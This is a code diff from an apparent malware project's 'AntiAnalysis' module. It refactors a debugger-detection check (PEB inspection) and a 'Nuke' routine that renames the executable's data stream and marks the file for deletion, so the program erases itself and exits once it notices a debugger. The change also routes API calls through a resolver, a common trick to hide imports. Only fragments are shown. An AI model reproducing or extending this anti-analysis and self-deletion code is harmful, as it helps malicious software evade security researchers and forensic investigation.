@@ -48,22 +48,28 @@ bool AntiAnalysis::PebCheck(API::APIResolver& resolver)
 {
     if (Peb(resolver)) {
         //MessageBoxA(NULL, "debugger", "debugger", NULL);
-        this->Nuke();
+        this->Nuke(resolver);
         ExitProcess(0);
     }
     return false;
 }
 
 
-int AntiAnalysis::Nuke(void)
+int AntiAnalysis::Nuke(API::APIResolver& resolver)
 {
     WCHAR                       szPath[MAX_PATH * 2] = { 0 };
-    FILE_DISPOSITION_INFO       dispinfo = { 0 };
-    HANDLE                      hFile = INVALID_HANDLE_VALUE;
-    PFILE_RENAME_INFO           pRename = NULL;
+    FILE_DISPOSITION_INFO       dispinfo             = { 0 };
+    HANDLE                      hFile                = INVALID_HANDLE_VALUE;
+    PFILE_RENAME_INFO           pRename              = NULL;
+
     const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
-    SIZE_T			            StreamLength = wcslen(NewStream) * sizeof(wchar_t);
-    SIZE_T                      sRename = sizeof(FILE_RENAME_INFO) + StreamLength;
+
+    SIZE_T StreamLength = wcslen(NewStream) * sizeof(wchar_t);
+    SIZE_T sRename      = sizeof(FILE_RENAME_INFO) + StreamLength;
+
+    auto resolve = resolver.GetAPIAccess();
+
+
 
     pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename); // Allocate memory for structure
 
@@ -91,7 +97,6 @@ int AntiAnalysis::Nuke(void)
     
     if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename))
         return FALSE;
-    
 
     CloseHandle(hFile);
 
